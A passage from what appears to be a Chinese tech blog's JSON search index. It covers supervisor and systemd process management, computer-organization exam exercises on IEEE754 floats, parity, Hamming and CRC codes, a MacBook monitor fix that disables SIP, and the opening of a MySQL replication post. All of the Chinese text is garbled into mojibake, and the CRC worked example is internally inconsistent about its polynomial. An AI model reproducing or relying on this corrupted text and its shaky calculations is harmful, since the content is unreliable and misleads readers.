æ³•æ­£å¸¸å¯åŠ¨ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨åˆ›å»ºç›®å½•\nstdout_logfile = /data/logs/usercenter_stdout.log\n```\n\n\n\n### 3.3 ä½¿ç”¨\n\n+ æ›´æ–°é…ç½®, ä¿®æ”¹é…ç½®åéœ€è¦æ›´æ–°\n\n  ```bash\nsupervisorctl update\n  ```\n  \n+ æŸ¥çœ‹log, ç›´æ¥æŸ¥çœ‹é…ç½®é‡Œçš„log å³å¯\n\n  ```bash\nstdout_logfile=/home/supervisor_log/uwsgi.log            \n  stderr_logfile=/home/supervisor_log/uwsgi.log\n  ```\n\n\n\n# 4. supervisor å¸¸ç”¨å‘½ä»¤\n\n```bash\nsupervisorctl update #æ›´æ–°æ–°çš„é…ç½®åˆ°supervisordï¼ˆä¸ä¼šé‡å¯åŸæ¥å·²è¿è¡Œçš„ç¨‹åºï¼‰\nsupervisorctl reload #è½½å…¥æ‰€æœ‰é…ç½®æ–‡ä»¶ï¼Œå¹¶æŒ‰æ–°çš„é…ç½®å¯åŠ¨ã€ç®¡ç†æ‰€æœ‰è¿›ç¨‹ï¼ˆä¼šé‡å¯åŸæ¥å·²è¿è¡Œçš„ç¨‹åºï¼‰\n\nsupervisorctl start xxx #å¯åŠ¨æŸä¸ªè¿›ç¨‹\nsupervisorctl restart xxx #é‡å¯æŸä¸ªè¿›ç¨‹\nsupervisorctl stop xxx #åœæ­¢æŸä¸€ä¸ªè¿›ç¨‹(xxx)ï¼Œxxxä¸º[program:theprogramname]é‡Œé…ç½®çš„å€¼\nsupervisorctl stop groupworker #é‡å¯æ‰€æœ‰å±äºåä¸ºgroupworkerè¿™ä¸ªåˆ†ç»„çš„è¿›ç¨‹(start,restartåŒç†)\nsupervisorctl stop all #åœæ­¢å…¨éƒ¨è¿›ç¨‹ï¼Œæ³¨ï¼šstartã€restartã€stopéƒ½ä¸ä¼šè½½å…¥æœ€æ–°çš„é…ç½®æ–‡\n\nsupervisorctl reread #å½“ä¸€ä¸ªæœåŠ¡ç”±è‡ªåŠ¨å¯åŠ¨ä¿®æ”¹ä¸ºæ‰‹åŠ¨å¯åŠ¨æ—¶æ‰§è¡Œä¸€ä¸‹å°±ok\n```\n\n\n\n# 5. systemdä»‹ç»\n\n> Systemdæ˜¯Linuxä¸­çš„No.1è¿›ç¨‹, å¯ä»¥ç”¨ systemd ç®¡ç† supervisor\n\nLinux æ“ä½œç³»ç»Ÿçš„å¯åŠ¨é¦–å…ˆä» BIOS å¼€å§‹ï¼Œç„¶åç”± Boot Loader è½½å…¥å†…æ ¸ï¼Œå¹¶åˆå§‹åŒ–å†…æ ¸ã€‚å†…æ ¸åˆå§‹åŒ–çš„æœ€åä¸€æ­¥å°±æ˜¯å¯åŠ¨ init è¿›ç¨‹ã€‚è¿™ä¸ªè¿›ç¨‹æ˜¯ç³»ç»Ÿçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼ŒPID ä¸º 1ï¼Œåˆå«è¶…çº§è¿›ç¨‹ï¼Œä¹Ÿå«æ ¹è¿›ç¨‹ã€‚å®ƒè´Ÿè´£äº§ç”Ÿå…¶ä»–æ‰€æœ‰ç”¨æˆ·è¿›ç¨‹ã€‚æ‰€æœ‰çš„è¿›ç¨‹éƒ½ä¼šè¢«æŒ‚åœ¨è¿™ä¸ªè¿›ç¨‹ä¸‹ï¼Œå¦‚æœè¿™ä¸ªè¿›ç¨‹é€€å‡ºäº†ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„è¿›ç¨‹éƒ½è¢« kill ã€‚å¦‚æœä¸€ä¸ªå­è¿›ç¨‹çš„çˆ¶è¿›ç¨‹é€€äº†ï¼Œé‚£ä¹ˆè¿™ä¸ªå­è¿›ç¨‹ä¼šè¢«æŒ‚åˆ° PID 1 ä¸‹é¢ã€‚\n\n2010çš„æœ‰ä¸€å¤©ï¼Œä¸€ä¸ªåœ¨ RedHatå·¥ä½œçš„å·¥ç¨‹å¸ˆ Lennart Poettering å’Œ Kay Sievers ï¼Œå¼€å§‹å¼•å…¥äº†ä¸€ä¸ªæ–°çš„ init ç³»ç»Ÿâ€”â€” systemdã€‚è¿™æ˜¯ä¸€ä¸ªéå¸¸éå¸¸æœ‰é‡å¿ƒçš„é¡¹ç›®ï¼Œè¿™ä¸ªé¡¹ç›®å‡ ä¹æ”¹å˜äº†æ‰€æœ‰çš„ä¸œè¥¿ï¼Œsystemd ä¸ä½†æƒ³å–ä»£å·²æœ‰çš„ init ç³»ç»Ÿï¼Œè€Œä¸”è¿˜æƒ³å¹²æ›´å¤šçš„ä¸œè¥¿ã€‚\n\n2014 å¹´ï¼ŒDebian Linux å› ä¸ºæƒ³å‡†å¤‡ä½¿ç”¨ systemd æ¥ä½œä¸ºæ ‡å‡†çš„ init å®ˆæŠ¤è¿›ç¨‹æ¥æ›¿æ¢ sysvinit ã€‚è€Œå›´ç»•è¿™ä¸ªäº‹çš„äº‰è®ºè¾¾åˆ°äº†ç©ºå‰çš„çƒ­åº¦ï¼Œäº‰è®ºä¸­å……æ»¡ç€ä»‡æ¨ï¼Œsystemd çš„æ”¯æŒè€…å’Œåå¯¹è€…éƒ½åœ¨äº’ç›¸è¾±éª‚ï¼Œå¯¼è‡´å½“æ—¶ Debian é˜µè¥å¼€å§‹åˆ†è£‚ã€‚\n\nä»Šå¤©ï¼Œsystemd å æ®äº†å‡ ä¹æ‰€æœ‰çš„ä¸»æµçš„ Linux å‘è¡Œç‰ˆçš„é»˜è®¤é…ç½®ï¼ŒåŒ…æ‹¬ï¼šArch Linuxã€CentOSã€CoreOSã€Debianã€Fedoraã€Megeiaã€OpenSUSEã€RHELã€SUSEä¼ä¸šç‰ˆå’Œ Ubuntuã€‚è€Œä¸”ï¼Œå¯¹äº CentOS, CoreOS, Fedora, RHEL, SUSEè¿™äº›å‘è¡Œç‰ˆæ¥è¯´ï¼Œä¸èƒ½æ²¡æœ‰ systemdã€‚\n\n\n\n# 6. supervisorå’Œ systemd å¯¹æ¯”\n\n### 6.1 supervisor\n\n+ ä¼˜ç‚¹\n\n  1 å¯ä»¥é€šè¿‡ç½‘é¡µæ‰§è¡Œå¯åŠ¨åœæ­¢çš„æ“ä½œ\n  2 å•é…ç½®æ–‡ä»¶å¯æ§åˆ¶å¤šä¸ªç¨‹åº\n  3 å¯æ§åˆ¶è¿›ç¨‹æ•°é‡\n  4 è¿›ç¨‹èµ„æºæ§åˆ¶èƒ½åŠ›æ¯”è¾ƒå¼º\n\n+ ç¼ºç‚¹\n\n  1 æœ¬èº«éœ€è¦è¢«ç›‘æ§\n  2 å¼€æœºè‡ªå¯ä¾èµ–å…¶ä»–ç¨‹åº\n  3 ä¸èƒ½è·¨ä¸»æœº\n  4 ä¾èµ–äºmeld3ã€setuptools\n  5 è¿›ç¨‹éœ€åœ¨å‰å°è¿è¡Œ\n\n\n\n### 6.2 systemd\n\n+ ä¼˜ç‚¹\n\n  1å¯ä½¿ç”¨æ¨¡æ¿æ–‡ä»¶\n  2 é™„å¸¦å®šæ—¶å™¨ã€è·¯å¾„ç›‘æ§å™¨ã€æ•°æ®ç›‘æ§å™¨ç­‰åŠŸèƒ½\n  3 æ¯”è¾ƒå¼±çš„è·¨ä¸»æœºèƒ½åŠ›ï¼ŒèŠ‚ç‚¹å¿…é¡»äº’ç›¸æ·»åŠ ssh keyä¿¡ä»»ï¼Œåªèƒ½è¿œç¨‹æ§åˆ¶å·²æœ‰çš„æœåŠ¡\n  4 å¼€æœºå¯ä»¥è‡ªå¯\n  5 å¤§å¤šæ•°å‘è¡Œç‰ˆçš„æ ‡å‡†é…ç½®\n  6 é…å¥—journalctläºŒè¿›åˆ¶ä¿å­˜æ—¥å¿—å¾ˆéš¾ä¼ªé€ ï¼Œæ—¥å¿—æ ¼å¼ç»Ÿä¸€ï¼Œæ—¥å¿—å¤§å°å¯é™åˆ¶\n  7 é™åˆ¶ç‰¹å®šæœåŠ¡å¯ç”¨çš„ç³»ç»Ÿèµ„æºé‡ä¾‹å¦‚CPUã€ç¨‹åºå †æ ˆã€æ–‡ä»¶å¥æŸ„æ•°é‡ã€å­è¿›ç¨‹æ•°é‡\n\n+ ç¼ºç‚¹\n\n  1 å¤šé…ç½®æ–‡ä»¶æ‰èƒ½é…ç½®å¤šä¸ªç¨‹åº\n\n  \n\n# 7. å‚è€ƒèµ„æ–™\n\n+ http://supervisord.org/index.html\n+ https://woni.link/post/12\n+ https://coolshell.cn/articles/17998.html","tags":["supervisor"],"categories":["å‘½ä»¤"]},{"title":"è®¡ç®—æœºç»„æˆåŸç†ç›¸å…³è€ƒé¢˜","url":"%2Fp%2F240de068.html","content":"\n\n\n# 1. è®¡ç®—200.11Dçš„ IEEE754å•ç²¾åº¦æµ®ç‚¹æ•°\n\n### 1.1 æ•´æ•°éƒ¨åˆ†200æ±‚äºŒè¿›åˆ¶\n\n|       | ç»“æœ | ä½™æ•° |\n| ----- | ---- | ---- |\n| 200/2 | 100  | 0    |\n| 100/2 | 50   | 0    |\n| 50/2  | 25   | 0    |\n| 25/2  | 12   | 1    |\n| 12/2  | 6    | 0    |\n| 6/2   | 3    | 0    |\n| 3/2   | 1    | 1    |\n| 1/2   | 0    | 1    |\n\näºŒè¿›åˆ¶ä¸º: 1100 1000 (å€’åº)\n\n<!-- more -->\n\n### 1.2 å°æ•°éƒ¨åˆ†0.11æ±‚äºŒè¿›åˆ¶\n\n|        | ç»“æœ | æ•´æ•°éƒ¨åˆ† |\n| ------ | ---- | -------- |\n| 0.11*2 | 0.22 | 0        |\n| 0.22*2 | 0.44 | 0        |\n| 0.44*2 | 0.88 | 0        |\n| 0.88*2 | 1.76 | 1        |\n| 0.76*2 | 1.52 | 1        |\n| 0.52*2 | 1.04 | 1        |\n| 0.04*2 | 0.08 | 0        |\n| 0.08*2 | 0.16 | 0        |\n\näºŒè¿›åˆ¶ä¸º 0001 1100(æ­£åº)\n\næ•´ä¸ªäºŒè¿›åˆ¶ä¸º: 200.11D = 11001000.00011100\n\n### 1.3 æ±‚IEEE754\n\n+ è®¡ç®—\n\n  ```bash\n  +200.11 = +11001000.00011100\n  \n  = +1.1001000 00011100 * 2^7    e=7=134-127\n  \n  S = 0(ç¬¦å·ä½)\n  E = 134D =10000110B (134çš„äºŒè¿›åˆ¶)\n  M = 1001 0000 0011 1000 0000 000 (å°æ•°ç‚¹1åé¢çš„,è¡¥é½23ä½)\n  ```\n\n+ æ‰€ä»¥äºŒè¿›åˆ¶å­˜å‚¨æ ¼å¼ä¸º\n\n  | ç¬¦å·ä½ | E(8ä½)    | M(23ä½)                      |\n  | ------ | --------- | ---------------------------- |\n  | 0      | 1000 0110 | 1001 0000 0011 1000 0000 000 |\n\n  ![1](è®¡ç®—æœºç»„æˆåŸç†æ ¡éªŒç è€ƒé¢˜/1.png)\n\n### 1.4 æ€»ç»“\n\n+ å•ç²¾åº¦æµ®ç‚¹æ•°å­—é•¿32ä½ï¼Œå°¾æ•°é•¿åº¦23ï¼ŒæŒ‡æ•°é•¿åº¦8, æŒ‡æ•°åç§»é‡127ï¼›\n\n+ https://www.binaryconvert.com/convert_float.html\n\n\n\n# 2. è®¡ç®—10001101çš„å¥‡æ ¡éªŒç å’Œå¶æ ¡éªŒç (æ ¡éªŒä½æ”¾åœ¨é¦–ä½)\n\nP=D1âŠ•D2âŠ•D3âŠ•D4âŠ•D5âŠ•D6âŠ•D7âŠ•D8\n\nP* =PâŠ•D1âŠ•D2âŠ•D3âŠ•D4âŠ•D5âŠ•D6âŠ•D7âŠ•D8\n\næ•°æ®: 10001101 \n\n+ å¥‡æ ¡éªŒç (1çš„ä¸ªæ•°ä¸ºå¥‡æ•°)\n\n  1 10001101\n\n+ å¶æ ¡éªŒç (1çš„ä¸ªæ•°ä¸ºå¶æ•°)\n\n  0 10001101\n\n\n\n# 3. è®¡ç®—æ•°æ® D=D4D3D2D1=1110çš„æµ·æ˜ç (å¥‡æ ¡éªŒ)\n\n### 3.1 è®¡ç®—\n\n2^r >= 4+1+r,   r = 3\n\næ•°æ®ä½ä¸º D4D3D2D1\n\næ ¡éªŒä½ä¸º P3P2P1\n\n| ç´¢å¼•       | 7     | 6    | 5    | 4    | 3    | 2    | 1    |\n| ---------- | ----- | ---- | ---- | ---- | ---- | ---- | ---- |\n| ä¿¡æ¯ä½     | D4    | D3   | D2   | P3   | D1   | P2   | P1   |\n| ä¿¡æ¯ä½å€¼ | 1     | 1    | 1    | P3   | 0    | P2   | P1   |\n| äºŒè¿›åˆ¶ | 111 | 110 | 101 | (100) | 011 | (010) | (001) |\n\n\nP1 = D1âŠ• D2 âŠ• D4 =  0 âŠ• 1 âŠ• 1 = 1(å¥‡æ£€éªŒ)\n\nP2 = D1âŠ• D3 âŠ• D4 = 0 âŠ• 1 âŠ• 1 = 1(å¥‡æ£€éªŒ)\n\nP3 = D2âŠ• D3 âŠ• D4 = 1 âŠ• 1 âŠ• 1 = 0(å¥‡æ£€éªŒ)\n\næ‰€ä»¥å¥‡æ ¡éªŒçš„æµ·æ˜ç ä¸º:  111 P3 0 P2 P1 =  1110 011\n\n### 3.2 æ€»ç»“\n\n+ 2^r â‰¥ k+r+1,  r æ˜¯æ ¡éªŒä½\n\n\n\n# 4. è®¡ç®—ä¿¡æ¯å¤šé¡¹å¼:101010110,ç”Ÿæˆå¤šé¡¹å¼1100çš„CRCæ ¡éªŒç \n\n1110 = 1* (x^3)  +  1 * ( x^2) +  1* (x^1) + 0 * (x^1)\n\n+ å…ˆè¡¥å……æœ€é«˜ä½æ¬¡æ•°,   101010 110 000\n+ é™¤æ•°1100\n\n| å•†:     |       |       |         | 1       | 1    | 0    | 0    | 1    | 1 | 0 | 1 | 1 | | |\n| ------- | ----- | ----- | ------- | ------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ------- | ------- |\n| è¢«é™¤æ•°: | 1     | 0     | 1       | 0       | 1    | 0    | 1    | 1    | 0    | 0    | 0    | 0    | | |\n|     | **1** | **1** | **0** | **0** |      |      |      |      |      |      |      |      | | |\n|     |       | 1     | 1       | 0       | 1    |      |      |      |      |      |      |      | | |\n|     |       | **1** | **1**   | **0**   | **0** |      |      |      |      |      |      |      | | |\n|     |       |       |         |         | 1    | 0    | 1    | 1    |      |      |      |      | | |\n|     |       |       |         |         | **1** | **1** | **0** | **0** |      |      |      |      | | |\n|     |       |       |         |         |      | 1 | 1 | 1 | 0 |      |      |      | | |\n|     |       |       |         |      |   | **1** | **1** | **0** | **0** |      |      |      | | |\n|     |       |       |         |         |      |      |      | 1 | 0 | 0 | 0 |      | | |\n|     |       |       |         |         |      |      |   | **1** | **1** | **0** | **0** |      | | |\n|     |       |       |         |         |      |      |      |      | 1 | 0 | 0 | 0 | | |\n|  | | | | | | | | | **1** | **1** | **0** | **0** | | |\n|  | | | | | | | | |  | 1 | 0 | 0 | | |\n|  | | | | | | | | |  |  |  |  | | |\n\nä½™æ•°ä¸º100\n\næ‰€ä»¥CRCæ ¡éªŒç ä¸º: 101010110 100\n\n### 4.2 è®¡ç®—æ­¥éª¤\n\n1. ç”¨æœ€é«˜ä½è¡¥é½è¢«é™¤æ•°\n2. æ‹¿å‡ºé™¤æ•°, è¿›è¡Œå¼‚æˆ–è¿ç®—\n3. å•†: å¤Ÿé™¤æ˜¯1, ä¸å¤Ÿé™¤æ˜¯0\n4. å¦‚æœä½™æ•°ä¸è¶³æœ€é«˜æ¬¡æ•°,  éœ€è¦è¡¥é½0\n5. æŠŠä½™æ•°æ”¾åœ¨å¤šé¡¹å¼åé¢å³å¯\n\n\n\n# 5. å¯»å€æ–¹å¼\n\n+ æŒ‡ä»¤å¯»å€æ–¹å¼\n\n+ æ“ä½œæ•°å¯»å€æ–¹å¼\n\n  + ç«‹å³å¯»å€\n\n    æŒ‡ä»¤ä¸­ç›´æ¥ç»™å‡ºæ“ä½œæ•°ï¼ŒæŒ‡ä»¤ä¸­çš„å½¢å¼åœ°å€å­—æ®µå³ä¸ºæ“ä½œæ•°ï¼Œåˆç§°ä¸ºç«‹å³æ•°å¯»å€ã€‚\n\n  + éšå«å¯»å€\n\n    éšå«å¯»å€æ˜¯æŒ‡ä»¤å­—ä¸­ä¸æ˜ç¡®ç»™å‡ºæ“ä½œæ•°çš„åœ°å€ï¼Œå…¶æ“ä½œæ•°éšå«åœ¨æ“ä½œç æˆ–æŸä¸ªå¯„å­˜å™¨ä¸­ã€‚\n\n  + ç›´æ¥å¯»å€\n\n      æŒ‡ä»¤ä¸­åœ°å€ç å­—æ®µä¸­ç»™å‡ºçš„åœ°å€ï¼Œå³ä¸ºæ“ä½œæ•°åœ¨ä¸»å­˜ä¸­çš„åœ°å€ï¼Œæ“ä½œæ•°åœ¨ä¸»å­˜ä¸­ã€‚\n\n  + é—´æ¥å¯»å€\n\n    æŒ‡ä»¤ä¸­åœ°å€ç å­—æ®µä¸­ç»™å‡ºçš„åœ°å€ï¼Œæ˜¯æ“ä½œæ•°åœ¨ä¸»å­˜ä¸­åœ°å€çš„åœ°å€ï¼Œæ“ä½œæ•°åœ¨ä¸»å­˜ä¸­ã€‚\n\n  + å¯„å­˜å™¨ç›´æ¥å¯»å€\n\n      æŒ‡ä»¤ä¸­åœ°å€ç ç»™å‡ºçš„æ˜¯å¯„å­˜å™¨çš„ç¼–å·ï¼Œæ“ä½œæ•°åœ¨æŒ‡å®šçš„å¯„å­˜å™¨ä¸­ã€‚\n\n      ç”±äºæ“ä½œæ•°ä¸åœ¨ä¸»å­˜ä¸­,æ•…è¿™ç§å¯»å€æ–¹å¼æ— éœ€è®¿å­˜ï¼Œå‡å°‘äº†æŒ‡ä»¤æ‰§è¡Œæ—¶é—´ã€‚ç”±äºåœ°å€å­—æ®µåªéœ€æŒ‡æ˜å¯„å­˜å™¨ç¼–å·,æ•…ä½æ•°è¾ƒå°‘ï¼ŒèŠ‚çœäº†å­˜å‚¨ç©ºé—´ã€‚  å› æ­¤ï¼Œå¯„å­˜å™¨ç›´æ¥å¯»å€æ–¹å¼å¾—åˆ°å¹¿æ³›åº”ç”¨ã€‚\n\n  + å¯„å­˜å™¨é—´æ¥å¯»å€\n\n    æŒ‡ä»¤ä¸­åœ°å€ç ç»™å‡ºçš„æ˜¯å¯„å­˜å™¨çš„ç¼–å·ï¼Œè¯¥å¯„å­˜å™¨ä¸­çš„å†…å®¹ä¸ºæ“ä½œæ•°åœ°å€ï¼Œæ“ä½œæ•°åœ¨ä¸»å­˜ä¸­ã€‚\n\n     è¿™ä¹Ÿæ˜¯ä¸€ç§è®¿å†…çš„å¯»å€æ–¹å¼ï¼Œä¸å­˜å‚¨å™¨é—´æ¥å¯»å€ç›¸æ¯”è¾ƒï¼Œåªéœ€ä¸€æ¬¡è®¿å†…å³å¯è·å¾—æ“ä½œæ•°ï¼Œæé«˜äº†æ‰§è¡Œé€Ÿåº¦ï¼ŒåŒæ ·å¾—åˆ°å¹¿æ³›åº”ç”¨ã€‚\n\n  + ç›¸å¯¹å¯»å€\n\n    ç›¸å¯¹å¯»å€æ˜¯æŠŠç¨‹åºè®¡æ•°å™¨PCçš„å†…å®¹åŠ ä¸ŠæŒ‡ä»¤æ ¼å¼ä¸­çš„å½¢å¼åœ°å€D(ç›¸å¯¹é‡)è€Œå½¢æˆæ“ä½œæ•°çš„æœ‰æ•ˆåœ°å€ã€‚\n\n    ç›¸å¯¹å¯»å€çš„æœ€å¤§ç‰¹ç‚¹æ˜¯æ“ä½œæ•°åœ°å€ä¸æŒ‡ä»¤åœ°å€ä¹‹é—´æ€»æ˜¯ç›¸å·®ä¸€ä¸ªå›ºå®šå€¼ï¼Œæ“ä½œæ•°åœ°å€éšPCçš„å˜åŒ–è€Œå˜åŒ–ã€‚å› æ­¤ï¼Œæ”¯æŒç¨‹åºåœ¨ä¸»å­˜ä¸­ä»»æ„æµ®åŠ¨ã€‚\n\n  + å˜å€å¯»å€\n\n    å˜å€å¯»å€æ–¹å¼ï¼šæ˜¯æŠŠå˜å€å¯„å­˜å™¨BXçš„å†…å®¹ä¸åç§»é‡Dä¹‹å’Œä½œä¸ºæ“ä½œæ•°æœ‰æ•ˆåœ°å€ã€‚(æœ‰æ—¶é€šç”¨å¯„å­˜å™¨ä¹Ÿå¯ä½œä¸ºå˜å€å™¨ä½¿ç”¨)\n\n    å˜å€å¯„å­˜å™¨çš„å†…å®¹æ˜¯ç”±ç¨‹åºå‘˜è®¾å®šçš„ï¼Œåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­å…¶å†…å®¹å¯å˜ï¼Œè€ŒæŒ‡ä»¤å­—ä¸­çš„åç§»é‡Dæ˜¯ä¸å¯å˜çš„ã€‚ å˜å€å¯»å€ä¸»è¦ç”¨äºæ•°ç»„å¤„ç†ã€‚\n\n  + åŸºå€å¯»å€\n\n    åŸºå€å¯»å€æ–¹å¼ï¼šæ˜¯æŠŠå˜å€å¯„å­˜å™¨BRçš„å†…å®¹ä¸åç§»é‡Dä¹‹å’Œä½œä¸ºæ“ä½œæ•°æœ‰æ•ˆåœ°å€ã€‚(æœ‰æ—¶é€šç”¨å¯„å­˜å™¨ä¹Ÿå¯ä½œä¸ºå˜å€å™¨ä½¿ç”¨)\n\n    åŸºå€å¯»å€å¯ä»¥æ‰©å¤§æŒ‡ä»¤å¯¹ä¸»å­˜çš„å¯»å€èŒƒå›´ã€‚åœ¨å¤šé“ç¨‹åºå’Œæµ®åŠ¨ç¨‹åºç¼–åˆ¶æ—¶ååˆ†æœ‰ç”¨ã€‚\n\n  + æ®µå¯»å€\n\n     æ®µå¯»å€æ˜¯ä¸€ç§ä¸ºäº†æ‰©å¤§å¯»å€èŒƒå›´è€Œé‡‡ç”¨çš„æŠ€æœ¯ã€‚\n\n    å¦‚é‡‡ç”¨å°†16ä½çš„æ®µå¯„å­˜å™¨å·¦ç§»4ä½ã€åŠ ä¸Š16ä½çš„åç§»é‡å½¢æˆ20ä½çš„ç‰©ç†åœ°å€ï¼Œæ‰©å¤§äº†å¯»å€ç©ºé—´ã€‚\n    \n  + å¤åˆå¯»å€æ–¹å¼ï¼š\n\n     æ˜¯å°†ä¸¤ç§åŸºæœ¬å¯»å€æ–¹å¼ç»“åˆå½¢æˆã€‚\n\n\n\n# 6. å‚è€ƒèµ„æ–™\n\n+ https://blog.csdn.net/crjmail/article/details/79723051\n+ https://zhuanlan.zhihu.com/p/26509678\n+ https://www.bilibili.com/video/BV1SJ41157pR\n+ https://www.bilibili.com/video/BV1xJ411K7Wx","tags":["æ ¡éªŒç "],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"macbookå¤–æ¥æ˜¾ç¤ºå™¨æ¨¡ç³Šé—®é¢˜","url":"%2Fp%2Fa6586325.html","content":"\n# 1. è§£å†³æ–¹æ¡ˆ\n\n### 1.0 ç¦æ­¢SIPå‰æ\n\n`command + R` è¿›å…¥macå®‰å…¨æ¨¡å¼, ç¦æ­¢SIP\n\n```bash\ncsrutil disable\n```\n\n<!-- more -->\n\n### 1.1 TV æ¨¡å¼å¼ºåˆ¶åˆ° RGB mode\n\n+ å‚è€ƒæ•™ç¨‹:\n\n  https://www.zhihu.com/question/19682094/answer/122193822\n\n  \n\n### 1.2 ä¸€é”®è„šæœ¬å¼€å¯HiDPI\n\nHiDPIæœ¬è´¨ä¸Šæ˜¯ç”¨è½¯ä»¶çš„æ–¹å¼å®ç°å•ä½é¢ç§¯å†…çš„é«˜å¯†åº¦åƒç´ ã€‚ç”¨å››ä¸ªåƒç´ ç‚¹æ¥è¡¨ç°ä¸€ä¸ªåƒç´ ï¼Œå› æ­¤èƒ½å¤Ÿæ›´åŠ æ¸…æ™°ç»†è…»ã€‚\n\n**é«˜PPI(ç¡¬ä»¶) + HiDPIæ¸²æŸ“(è½¯ä»¶) = æ›´ç»†è…»çš„æ˜¾ç¤ºæ•ˆæœ(retina)**\n\n+ é¡¹ç›®åœ°å€\n\n  https://github.com/xzhih/one-key-hidpi\n\n+ å‚è€ƒæ•™ç¨‹:\n\n  https://blog.haitianhome.com/macbook-2k-hidpi.html\n\n  é€‰æ‹©æ—¶é€‰æ‹©æœ€å¤§çš„å³å¯\n\n\n\n### 1.3 å®‰è£…RDMè½¯ä»¶\n\n+ é¡¹ç›®åœ°å€\n\n  https://github.com/avibrazil/RDM\n\n+ å‚è€ƒæ•™ç¨‹:\n\n  https://www.zhihu.com/question/19682094/answer/669420795 \n\n\n\n# 2. æ˜¾ç¤ºå™¨æ¥å£ä»‹ç»\n\nç›®å‰æ˜¾ç¤ºå™¨çš„çš„æ¥å£æœ‰DP HDMI VGA DVIè¿™å‡ ç§ï¼Œè¿™äº›æ¥å£çš„å½¢çŠ¶ä¹Ÿéƒ½ä¸åŒï¼Œæˆ‘ä»¬åœ¨é€‰è´­ä¸»æœºçš„æ—¶å€™ï¼Œä¸€èˆ¬éƒ½è¦è€ƒè™‘ä¸»æœºçš„æ˜¾å¡æ¥å£æ˜¯å¦ä¸æ˜¾ç¤ºå™¨æ¥å£ç›¸åŒ¹é…ã€‚VGAç›®å‰è¢«æ·˜æ±°æ‰äº†ï¼Œè¿™æ˜¯å› ä¸ºVGAä¼ è¾“çš„æ˜¯æ¨¡æ‹Ÿä¿¡å·ã€‚\n\nä»æ¥å£æ€§èƒ½ä¸Šæ¥çœ‹ï¼Œæ˜¾ç¤ºå™¨æ¥å£çš„æ€§èƒ½æ˜¯ DP>HDMI>DVI>VGAã€‚\n\n+ **VGAæ¥å£**\n\n  é•¿çš„å¤šé’ˆå­”\n\n  å…¶ä¸­ VGAæ˜¯æ¨¡æ‹Ÿä¿¡å·ï¼Œç›®å‰å·²ç»è¢«ä¸»æµæ·˜æ±°ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬ç›®å‰èƒ½åœ¨æœ€æ–°æ˜¾å¡ä¸Šçœ‹åˆ°å…¶ä»–ä¸‰ç§æ¥å£å´çœ‹ä¸åˆ°VGAæ¥å£çš„åŸå› ï¼ŒDVIã€HDMIã€DP éƒ½æ˜¯æ•°å­—ä¿¡å·ï¼Œæ˜¯ç›®å‰çš„ä¸»æµã€‚\n\n+ **DVIæ¥å£**\n\n  DVIæ˜¯é«˜æ¸…æ¥å£ï¼Œä½†ä¸å¸¦éŸ³é¢‘ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒDVIè§†é¢‘æ¥çº¿åªä¼ è¾“ç”»é¢å›¾å½¢ä¿¡å·ï¼Œä½†ä¸ä¼ è¾“éŸ³é¢‘ä¿¡å·ã€‚ä½†æ˜¯DVIæ¥å£ä¹Ÿæœ‰ä¸å°‘å¼Šç«¯ï¼šç”±äºæœ€åˆè®¾è®¡æ—¶æ˜¯ä¸ºPCç«¯è¿›è¡Œçš„ï¼Œæ‰€ä»¥å¯¹äºç”µè§†ç­‰å…¼å®¹èƒ½åŠ›è¾ƒå·®ã€åªæ”¯æŒ8bitçš„RGBä¿¡å·ä¼ è¾“ã€å…¼å®¹æ€§è€ƒè™‘ï¼Œé¢„ç•™äº†ä¸å°‘å¼•è„šä»¥æ”¯æŒæ¨¡æ‹Ÿè®¾å¤‡ï¼Œé€ æˆæ¥å£ä½“ç§¯è¾ƒå¤§ã€‚ç›®å‰æ¯”è¾ƒå¥½çš„DVIæ¥å£èƒ½å¤Ÿä¼ è¾“2Kç”»é¢ï¼Œä½†ä¹ŸåŸºæœ¬æ˜¯æé™äº†ã€‚\n\n+ **HDMIæ¥å£**\n\n  é•¿çš„ç±»ä¼¼USB\n\n  HDMIæ—¢èƒ½ä¼ è¾“é«˜æ¸…å›¾å½¢ç”»é¢ä¿¡å·ï¼Œä¹Ÿèƒ½å¤Ÿä¼ è¾“éŸ³é¢‘ä¿¡å·ã€‚\n\n+ **DPæ¥å£**\n\n  DPæ¥å£ä¹Ÿæ˜¯ä¸€ç§é«˜æ¸…æ•°å­—æ˜¾ç¤ºæ¥å£æ ‡å‡†ï¼Œå¯ä»¥è¿æ¥ç”µè„‘å’Œæ˜¾ç¤ºå™¨ï¼Œä¹Ÿå¯ä»¥è¿æ¥ç”µè„‘å’Œå®¶åº­å½±é™¢ã€‚DPæ¥å£å¯ä»¥ç†è§£æ˜¯HDMIçš„åŠ å¼ºç‰ˆï¼Œåœ¨éŸ³é¢‘å’Œè§†é¢‘ä¼ è¾“æ–¹é¢æ›´åŠ å¼ºæ‚ã€‚\n\n  ç›®å‰æƒ…å†µä¸‹ï¼ŒDPä¸HDMIåœ¨æ€§èƒ½ä¸Šæ²¡æœ‰å¤šå¤§åŒºåˆ«ã€‚å¦‚æœä½ ä½¿ç”¨3840*2160åˆ†è¾¨ç‡ï¼ˆ4Kï¼‰ï¼ŒHDMIç”±äºå¸¦å®½ä¸è¶³ï¼Œæœ€å¤§åªèƒ½ä¼ é€30å¸§ï¼ŒDPå°±æ²¡æœ‰é—®é¢˜ã€‚\n\n+ å‚è€ƒèµ„æ–™\n\n  https://www.zhihu.com/question/19571221/answer/569037388\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://www.zhihu.com/question/19682094\n+ https://sspai.com/post/57549\n+ https://blog.haitianhome.com/macbook-2k-hidpi.html\n+ https://zhuanlan.zhihu.com/p/43249762","tags":["mac"],"categories":["è½¯ä»¶"]},{"title":"æ•°æ®åº“çš„ä¸»ä»å¤åˆ¶","url":"%2Fp%2F2aa5fdb4.html","content":"\n# 1. Mysqlä¸»ä»å¤åˆ¶\n\nMySQLä¸»ä»å¤åˆ¶æ¶‰åŠåˆ°ä¸‰ä¸ªçº¿ç¨‹\n\n+ ä¸€ä¸ªè¿è¡Œåœ¨ä¸»èŠ‚ç‚¹ï¼ˆlog dump threadï¼‰\n\n+ 